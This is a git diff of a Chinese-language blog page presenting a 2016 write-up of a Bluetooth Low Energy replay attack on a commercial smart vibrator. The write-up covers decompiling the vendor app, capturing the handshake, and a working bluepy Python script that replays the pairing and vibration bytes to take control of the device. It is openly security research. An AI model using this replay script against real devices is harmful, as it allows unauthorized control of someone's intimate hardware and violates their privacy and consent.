@@ -91,18 +91,35 @@
 
 
 
-<meta name="description" content="即便停下脚步，也只是一片荒芜">
+<meta name="description" content="拥尔智能跳蛋该产品就不多做介绍了，大家知道就好，详见官网 研究目的通过脚本实现对跳蛋的远程控制。 分析过程该跳蛋的“玩法”如下，并预设了6种震动模式：定位到com/makerx/toy/activity/ShakeActivity类的相应代码段。进一步逆向，可拿到各模式所对应的震动指令。以“自动模式”为例，它的控制指令为{91,127,48,-113,48,-97,48,-81,48,-65,48">
 <meta name="keywords" content="BLE,重放攻击">
 <meta property="og:type" content="article">
 <meta property="og:title" content="爱无惧距离，记一次对智能跳蛋的入侵">
 <meta property="og:url" content="http://yoursite.com/2016/07/07/智能跳蛋/index.html">
 <meta property="og:site_name" content="Shell In Ghost">
-<meta property="og:description" content="即便停下脚步，也只是一片荒芜">
+<meta property="og:description" content="拥尔智能跳蛋该产品就不多做介绍了，大家知道就好，详见官网 研究目的通过脚本实现对跳蛋的远程控制。 分析过程该跳蛋的“玩法”如下，并预设了6种震动模式：定位到com/makerx/toy/activity/ShakeActivity类的相应代码段。进一步逆向，可拿到各模式所对应的震动指令。以“自动模式”为例，它的控制指令为{91,127,48,-113,48,-97,48,-81,48,-65,48">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-03-31T09:43:59.779Z">
+<meta property="og:image" content="http://p6gcqvz2z.bkt.clouddn.com/1.png">
+<meta property="og:image" content="http://p6gcqvz2z.bkt.clouddn.com/2.png">
+<meta property="og:image" content="http://p6gcqvz2z.bkt.clouddn.com/3.png">
+<meta property="og:image" content="http://p6gcqvz2z.bkt.clouddn.com/4.png">
+<meta property="og:image" content="http://p6gcqvz2z.bkt.clouddn.com/5.png">
+<meta property="og:image" content="http://p6gcqvz2z.bkt.clouddn.com/6.png">
+<meta property="og:image" content="http://p6gcqvz2z.bkt.clouddn.com/7.png">
+<meta property="og:image" content="http://p6gcqvz2z.bkt.clouddn.com/8.png">
+<meta property="og:image" content="http://p6gcqvz2z.bkt.clouddn.com/9.png">
+<meta property="og:image" content="http://p6gcqvz2z.bkt.clouddn.com/10.png">
+<meta property="og:image" content="http://p6gcqvz2z.bkt.clouddn.com/11.png">
+<meta property="og:image" content="http://p6gcqvz2z.bkt.clouddn.com/12.png">
+<meta property="og:image" content="http://p6gcqvz2z.bkt.clouddn.com/13.png">
+<meta property="og:image" content="http://p6gcqvz2z.bkt.clouddn.com/14.png">
+<meta property="og:image" content="http://p6gcqvz2z.bkt.clouddn.com/15.png">
+<meta property="og:image" content="http://p6gcqvz2z.bkt.clouddn.com/16.png">
+<meta property="og:updated_time" content="2018-03-31T11:28:24.274Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="爱无惧距离，记一次对智能跳蛋的入侵">
-<meta name="twitter:description" content="即便停下脚步，也只是一片荒芜">
+<meta name="twitter:description" content="拥尔智能跳蛋该产品就不多做介绍了，大家知道就好，详见官网 研究目的通过脚本实现对跳蛋的远程控制。 分析过程该跳蛋的“玩法”如下，并预设了6种震动模式：定位到com/makerx/toy/activity/ShakeActivity类的相应代码段。进一步逆向，可拿到各模式所对应的震动指令。以“自动模式”为例，它的控制指令为{91,127,48,-113,48,-97,48,-81,48,-65,48">
+<meta name="twitter:image" content="http://p6gcqvz2z.bkt.clouddn.com/1.png">
 
 
 
@@ -409,7 +426,18 @@
       
 
       
-        
+        <h2 id="拥尔智能跳蛋"><a href="#拥尔智能跳蛋" class="headerlink" title="拥尔智能跳蛋"></a>拥尔智能跳蛋</h2><p>该产品就不多做介绍了，大家知道就好，详见<a href="http://www.1024online.com/" target="_blank" rel="noopener">官网</a><br><img src="http://p6gcqvz2z.bkt.clouddn.com/1.png" alt="介绍"><img src="http://p6gcqvz2z.bkt.clouddn.com/2.png" alt="介绍"></p>
+<h2 id="研究目的"><a href="#研究目的" class="headerlink" title="研究目的"></a>研究目的</h2><p>通过脚本实现对跳蛋的远程控制。</p>
+<h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>该跳蛋的“玩法”如下，并预设了6种震动模式：<br><img src="http://p6gcqvz2z.bkt.clouddn.com/3.png" alt="APP_Gui"><img src="http://p6gcqvz2z.bkt.clouddn.com/4.png" alt="APP_Gui"><br>定位到com/makerx/toy/activity/ShakeActivity类的相应代码段。<br><img src="http://p6gcqvz2z.bkt.clouddn.com/5.png" alt="反编译"><img src="http://p6gcqvz2z.bkt.clouddn.com/6.png" alt="反编译">进一步逆向，可拿到各模式所对应的震动指令。以“自动模式”为例，它的控制指令为{91,127,48,-113,48,-97,48,-81,48,-65,48,-49,48,-33,48,-17,48}字符数组，换算成16进制即“5b 7F 30 8F 30 9F 30 AF 30 BF 30 CF 30 DF 30 EF 30”，抓取的BLE包也验证了这一点。<br><img src="http://p6gcqvz2z.bkt.clouddn.com/7.png" alt="反编译"><img src="http://p6gcqvz2z.bkt.clouddn.com/8.png" alt="反编译"><img src="http://p6gcqvz2z.bkt.clouddn.com/9.png" alt="对应关系">在理解它的震动原理后，尝试直接向Handle  0x000B 发送{5b，7F，30，8F，30，9F，30，AF，30，BF，30，CF，30，DF，30，EF，30}字节数组，进行重放，看是否能够震动起来。。  </p>
+<ol>
+<li>通过kali linux 和蓝牙适配器，模拟蓝牙栈，连接智能跳蛋；<br><img src="http://p6gcqvz2z.bkt.clouddn.com/10.png" alt="bluez"><img src="http://p6gcqvz2z.bkt.clouddn.com/11.png" alt="bluez"></li>
+<li>使用char-write-req命令，向0x000B  AttHandle发送相关震动命令，然而却并没有任何反应。这里猜测在前面存在一个绑定的过程，于是需要把这个环节也弄清楚；<br><img src="http://p6gcqvz2z.bkt.clouddn.com/12.png" alt="char-write-req"></li>
+<li>重新对蓝牙的数据包进行分析，注意到是在写入以下信息后，才有Notify返回；<br><img src="http://p6gcqvz2z.bkt.clouddn.com/13.png" alt="BLE数据包"><img src="http://p6gcqvz2z.bkt.clouddn.com/14.png" alt="BLE数据包"><img src="http://p6gcqvz2z.bkt.clouddn.com/15.png" alt="BLE数据包"></li>
+<li>于是，进行重放时，还需要将这些信息也一起写入。否则，跳蛋设备不会响应我们所发送的控制指令。找到<a href="https://github.com/IanHarvey/bluepy" target="_blank" rel="noopener">bluepy</a>这个项目并安装，根据其下的btle.py脚本做简单修改，即可实现一个小程序，实现对跳蛋的远程控制；<br><img src="http://p6gcqvz2z.bkt.clouddn.com/16.png" alt="bluepy项目"></li>
+<li>运行该脚本，成功控制跳蛋震动（通过更换指令，还由其他模式可以选择）。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hackFlow</span><span class="params">(conn, address)</span>:</span></span><br><span class="line">    conn.waitForNotifications(<span class="number">2</span>)</span><br><span class="line">    conn.writeCharacteristic(<span class="number">0x000B</span>, <span class="string">"\x01\x03\x02\x04\x06\x05"</span>, <span class="keyword">True</span>)</span><br><span class="line">    conn.writeCharacteristic(<span class="number">0x000B</span>,<span class="string">"\x5F\x0A"</span>,<span class="keyword">True</span>)</span><br><span class="line">    conn.writeCharacteristic(<span class="number">0x000B</span>,<span class="string">"\x6C"</span>,<span class="keyword">True</span>)</span><br><span class="line">    conn.waitForNotifications(<span class="number">2</span>)</span><br><span class="line">    conn.writeCharacteristic(<span class="number">0x000B</span>,<span class="string">"\x5b\x7F\x30\x8F\x30\x9F\x30\xAF\x30\xBF\x30\xCF\x30\xDF\x30\xEF\x30"</span>,<span class="keyword">True</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#if len(sys.argv) &lt; 2:</span></span><br><span class="line">    <span class="comment">#    sys.exit("Usage:\n  %s &lt;mac-address&gt; [random]" % sys.argv[0])</span></span><br><span class="line">    <span class="comment">#if not os.path.isfile(helperExe):</span></span><br><span class="line">    <span class="comment">#   raise ImportError("Cannot find required executable '%s'" % helperExe)</span></span><br><span class="line">    print(<span class="string">"connecting..."</span>)</span><br><span class="line">    devAddr = getAddress() <span class="comment">#sys.argv[1]</span></span><br><span class="line">    addrType = ADDR_TYPE_PUBLIC</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    conn = Peripheral(devAddr, addrType)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        hackFlow(conn,devAddr)</span><br><span class="line">        print(<span class="string">"vibering..."</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        print(<span class="string">"disconnect..."</span>)</span><br><span class="line">        conn.disconnect()</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+
       
     </div>
     
@@ -530,8 +558,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -624,6 +661,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#拥尔智能跳蛋"><span class="nav-number">1.</span> <span class="nav-text">拥尔智能跳蛋</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#研究目的"><span class="nav-number">2.</span> <span class="nav-text">研究目的</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析过程"><span class="nav-number">3.</span> <span class="nav-text">分析过程</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
